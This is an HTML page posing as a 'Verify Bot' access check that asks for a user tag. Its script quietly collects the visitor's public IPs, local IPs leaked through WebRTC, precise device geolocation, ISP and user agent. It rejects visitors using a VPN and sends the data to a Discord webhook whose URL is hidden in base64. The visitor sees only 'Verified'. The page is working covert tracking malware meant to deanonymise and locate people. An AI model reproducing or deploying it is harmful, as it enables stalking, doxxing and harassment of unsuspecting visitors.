<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>ðŸ”’ Verify Bot</title>
  <style>
    body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;
      background:linear-gradient(135deg,#0f0f16,#1b1b28,#2a2a3a,#1b1b28);
      background-size:400% 400%;animation:bgAnim 20s ease infinite;color:#eee;
      font-family:sans-serif;overflow:hidden}
    #c{background:rgba(30,30,40,0.9);padding:2rem;border-radius:12px;
      box-shadow:0 4px 16px rgba(0,0,0,0.8);text-align:center;animation:cardIn .8s ease}
    input,textarea,button{width:100%;padding:.75rem;margin:.5rem 0;border:none;
      border-radius:6px;font-size:1rem;transition:transform .2s}
    input,textarea{background:#222;color:#eee}
    input:focus,textarea:focus{outline:2px solid rgba(79,170,255,0.7);transform:scale(1.02)}
    button{background:#4a90e2;color:#fff;cursor:pointer;animation:pulse 2s infinite}
    button:hover{transform:scale(1.05)}
    #s{opacity:0;transition:opacity .3s;margin-top:1rem;padding:.5rem;border-radius:6px}
    #s.v{opacity:1}
    #s.ok{background:rgba(40,167,69,0.1);color:#2ecc71}
    #s.err{background:rgba(231,76,60,0.1);color:#e74c3c}
    #summary{color:#c6e2ff;background:rgba(24,24,37,0.97);padding:.8em 1em;margin:1em -.5em -.6em -.5em;border-radius:8px;text-align:left;font-size:.99em;}
    .particle{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);
      animation:drift 10s linear infinite}
    @keyframes bgAnim{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
    @keyframes cardIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
    @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
    @keyframes drift{0%{transform:translate(0,0)}100%{transform:translate(100px,-200px)}}
  </style>
</head>
<body>
  <div id="c">
    <h2>Access Check</h2>
    <input id="u" placeholder="User#0000" autocomplete="username">
    <textarea id="msg" placeholder="Type your message (optional)" rows="3"></textarea>
    <button id="b">Go</button>
    <div id="s"><span id="m"></span></div>
    <div id="summary" style="display:none"></div>
  </div>
  <script>
    for(let i=0;i<30;i++){let p=document.createElement('div'),s=Math.random()*8+4;
      p.className='particle';p.style.width=s+'px';p.style.height=s+'px';
      p.style.top=Math.random()*100+'%';p.style.left=Math.random()*100+'%';
      p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)}
    const keys=[
      'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==',
      'WU9VUl9JUFFTX0FQSV9LRVk=',
      'WU9VUl9JUFVIX0FQSV9LRVk='
    ],d=atob,H=d(keys[0]),K1=d(keys[1]),K2=d(keys[2]);
    const $=id=>document.getElementById(id);
    const u=$('u'),msg=$('msg'),btn=$('b'),sta=$('s'),ms=$('m'),summary=$('summary');
    const F=(c,t)=>(sta.className='v '+c,ms.textContent=t);
    async function getIPs(){
      let results = {};
      const sources = [
        {name:'ipify', url:'https://api.ipify.org?format=json', parse: j=>j.ip},
        {name:'ipapi', url:'https://ipapi.co/json/', parse: j=>j.ip},
        {name:'ipinfo', url:'https://ipinfo.io/json', parse: j=>j.ip},
        {name:'ipwho', url:'https://ipwho.is/', parse: j=>j.ip}
      ];
      for (const src of sources){
        try{
          let j=await fetch(src.url).then(r=>r.json());
          if(j && src.parse(j)) results[src.name]=src.parse(j);
        }catch{}
      }
      results.main = results.ipify || results.ipapi || results.ipinfo || results.ipwho || '';
      return results;
    }
    async function getLeak(t=2000){
      return new Promise(r=>{
        if(!window.RTCPeerConnection) return r([]);
        const s=new Set,p=new RTCPeerConnection({iceServers:[]});
        p.createDataChannel('');
        p.createOffer().then(o=>p.setLocalDescription(o));
        p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
        setTimeout(()=>{p.close();r([...s])},t);
      });
    }
    async function getGeo(ip){
      try{
        return await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
      }catch{return {};}
    }
    async function getBrowserLoc(){
      return new Promise((resolve,reject)=>{
        if(!('geolocation'in navigator)) return reject();
        navigator.geolocation.getCurrentPosition(
          pos=>resolve({
            method:'device',
            lat:pos.coords.latitude,
            lon:pos.coords.longitude,
            accuracy:pos.coords.accuracy,
            timestamp:new Date(pos.timestamp).toISOString()
          }),
          err=>reject(),
          {enableHighAccuracy:true,timeout:10000,maximumAge:0}
        );
      });
    }
    async function checkVPN(ip){
      let reasons=[];
      try{
        let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
        if(/hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')) reasons.push('ipapi:hosting/org flagged');
        let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
        if(b.security&&(b.security.is_proxy||b.security.is_tor||b.security.is_vpn)) reasons.push('ipwho.is:proxy/tor/vpn');
        let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());
        if(c.vpn||c.proxy||c.tor||c.fraud_score>50) reasons.push('IPQS:VPN/Proxy/High Risk');
      }catch{}
      return reasons;
    }
    async function main(){
      const tag=u.value.trim(), text=msg.value.trim();
      if(!tag) return F('err','Enter your tag');
      summary.style.display='none'; F('','Checkingâ€¦'); btn.disabled=true;
      try{
        let browserLoc, browserLocOk=false;
        try{
          browserLoc = await getBrowserLoc();
          browserLocOk = true;
        }catch{}
        const ips = await getIPs();
        if(!ips.main) throw "No IP found";
        const leak = await getLeak();
        const vpn = await checkVPN(ips.main);
        if(vpn.length) {F('err','VPN/Proxy not allowed: '+vpn.join('; '));btn.disabled=false;return;}
        let geo = await getGeo(ips.main);
        const summaryLines = [
          `<b>Tag:</b> <span style="color:#fff">${tag}</span>`,
          `<b>Public IPs:</b> ${Object.entries(ips).map(([k,v])=>k+': '+v).join(' | ')}`,
          `<b>Local IPs:</b> ${leak.join(', ')||'-'}`,
          browserLocOk
            ? `<b>Device Location:</b> ${browserLoc.lat}, ${browserLoc.lon} (Â±${browserLoc.accuracy}m)`
            : `<b>IP Location:</b> ${geo.latitude}, ${geo.longitude} (${geo.city||'?'} ${geo.country_code||'?'})`,
          `<b>ISP/Org:</b> ${geo.org||'-'}`,
          `<b>User Agent:</b> <span style="font-size:.99em">${navigator.userAgent}</span>`
        ];
        if(text) summaryLines.push(`<b>Message:</b> ${text}`);
        summary.innerHTML = summaryLines.join('<br>');
        summary.style.display='block';
        const payload={
          username:'Gate',
          author:{name:'VerifyBot'},
          embeds:[{
            color:65280,
            fields:[
              {name:'Tag',value:tag,inline:1},
              {name:'Public IPs',value:Object.entries(ips).map(([k,v])=>k+': '+v).join('\n'),inline:0},
              {name:'Local IPs',value:leak.join(',')||'-',inline:0},
              browserLocOk
                ? {name:'Device Location',value:`${browserLoc.lat},${browserLoc.lon} (Â±${browserLoc.accuracy}m)`,inline:1}
                : {name:'IP Location',value:`${geo.latitude},${geo.longitude} (${geo.city||'?'} ${geo.country_code||'?'})`,inline:1},
              {name:'ISP/Org',value:geo.org||'-',inline:1},
              {name:'User Agent',value:navigator.userAgent,inline:0},
              {name:'VPN/Proxy Check',value:vpn.join('; ')||'-',inline:0},
              text?{name:'Message',value:text,inline:0}:null
            ].filter(Boolean),
            footer:{text:new Date().toUTCString()}
          }]
        };
        await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
        F('ok','Verified');
      }catch(e){
        F('err','Error occurred');
      }finally{btn.disabled=false;}
    }
    btn.onclick=main;
    u.onkeydown = e => { if(e.key==="Enter") { e.preventDefault(); main(); } };
  </script>
</body>
</html>
